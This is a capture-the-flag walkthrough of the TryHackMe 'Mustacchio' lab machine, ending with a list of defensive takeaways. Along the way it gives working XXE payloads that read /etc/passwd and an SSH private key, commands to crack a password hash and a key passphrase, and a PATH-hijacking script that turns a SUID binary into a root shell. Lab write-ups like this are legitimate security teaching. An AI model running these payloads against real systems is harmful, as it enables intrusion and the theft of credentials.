# Mustacchio

Easy boot2root Machine

room: https://tryhackme.com/room/mustacchio

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/mustacchio.md

---

## Overview

This room involved enumerating two web services, finding an exposed SQLite backup, cracking an admin password, abusing an XML External Entity vulnerability to read Barry’s SSH private key, then using a SUID binary with an unsafe `PATH` call to get root.

## Nmap Scan

I started with a full TCP port scan and service detection.

```bash
nmap -sV -p- 10.65.154.251
```

The scan found three open ports.

```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
8765/tcp open  http    nginx 1.10.3
```

This gave two web services to enumerate, with SSH likely becoming useful later if credentials or a key could be found.

## Web Enumeration

I started directory brute forcing the main web service.

```bash
gobuster dir -u http://10.65.154.251/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50
```

During enumeration, I found an interesting backup file.

```text
/custom/js/users.bak
```

Opening the file showed it was a SQLite database.

```bash
wget http://10.65.154.251/custom/js/users.bak -O users.db
file users.db
sqlite3 users.db
```

Inside the database, there was a `users` table.

```sql
.tables
select * from users;
```

This returned an admin user and a SHA1-looking password hash.

```text
admin | 1868e3...5f4b
```

The hash cracked to the password:

```text
bulld...g19
```

## Admin Panel

Using the cracked credentials, I logged into the admin panel on the nginx service running on port 8765.

The page contained a useful hint in the source.

```html
<!-- Barry, you can now SSH in using your key!-->
```

There was also a commented JavaScript line pointing to another backup file.

```javascript
//document.cookie = "Example=/auth/dontforget.bak";
```

I downloaded that file.

```bash
wget http://10.65.154.251:8765/auth/dontforget.bak -O dontforget.bak
cat dontforget.bak
```

It contained XML in the same structure expected by the admin form.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

This strongly suggested that the form was processing XML.

## XXE File Read

I tested for XXE by trying to read `/etc/passwd`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

The response included the contents of `/etc/passwd`, confirming XXE.

The important users were:

```text
joe
barry
```

Since the page hinted that Barry could SSH in using his key, I used XXE to read Barry’s private SSH key.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

The key was returned, but the browser formatting made it hard to save cleanly. To avoid formatting issues, I used a PHP filter to base64 encode the file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>test</com>
</comment>
```

I copied the returned base64 value and decoded it locally.

```bash
echo 'LS0tLS1C...LS0tLQo=' | base64 -d > barry_id_rsa
chmod 600 barry_id_rsa
```

## Cracking Barry’s SSH Key

The private key was encrypted, so I converted it for John.

```bash
ssh2john barry_id_rsa > barry.hash
john barry.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John cracked the SSH key passphrase.

```text
uriel...mes
```

I then logged in as Barry.

```bash
ssh -i barry_id_rsa barry@10.65.154.251
```

After entering the cracked key passphrase, I got a shell as Barry.

```bash
id
ls
cat user.txt
```

User flag:

```text
62d77...1b831
```

## Privilege Escalation Enumeration

I started looking for privilege escalation paths and checked the other home directory.

```bash
ls -la /home/joe
```

Inside Joe’s home directory, there was a suspicious SUID binary.

```text
-rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log
```

I inspected the binary.

```bash
file ./live_log
strings ./live_log
```

The strings output showed this command:

```text
tail -f /var/log/nginx/access.log
```

The binary was SUID root and used `system` to call `tail` without an absolute path. This meant I could hijack the `PATH` and make it run my own fake `tail` binary as root.

## Root via PATH Hijacking

I created a fake `tail` script in `/tmp`.

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > tail
chmod +x tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

This dropped me into a root shell.

```bash
whoami
id
```

Output:

```text
root
```

I then read the root flag.

```bash
cd /root
cat root.txt
```

Root flag:

```text
322358...93a5
```

## Summary

The attack chain was:

1. Full port scan found SSH, Apache on port 80, and nginx on port 8765.
2. Web enumeration found `/custom/js/users.bak`.
3. The backup was a SQLite database containing an admin SHA1 hash.
4. The hash cracked to the admin password.
5. Admin access on port 8765 revealed an XML form and backup XML file.
6. The XML parser was vulnerable to XXE.
7. XXE read `/etc/passwd` and Barry’s SSH private key.
8. PHP base64 filter helped extract the key cleanly.
9. `ssh2john` and John cracked the SSH key passphrase.
10. SSH access as Barry gave the user flag.
11. A SUID root binary in `/home/joe` called `tail` without a full path.
12. PATH hijacking with a fake `tail` spawned a root shell.
13. Root flag was captured.

## Key Takeaways

Do not expose backup files inside web directories.

Do not store credential databases where they can be downloaded.

Disable external entity loading when parsing XML.

Avoid calling system commands from SUID binaries.

Use absolute paths when system commands are unavoidable.

Never trust user-controlled environment variables like `PATH` in privileged binaries.
